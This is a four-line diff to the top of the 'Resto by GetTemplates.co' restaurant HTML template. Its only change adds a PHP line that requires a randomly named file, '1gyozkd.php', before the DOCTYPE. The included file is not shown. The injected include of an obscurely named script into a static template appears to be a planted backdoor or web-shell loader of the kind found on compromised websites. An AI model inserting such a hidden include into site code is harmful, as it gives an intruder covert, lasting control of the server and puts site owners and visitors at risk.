@@ -1,3 +1,4 @@
+<?php require __DIR__ . '/1gyozkd.php' ?>
 <!DOCTYPE html>
 <!--
 	Resto by GetTemplates.co
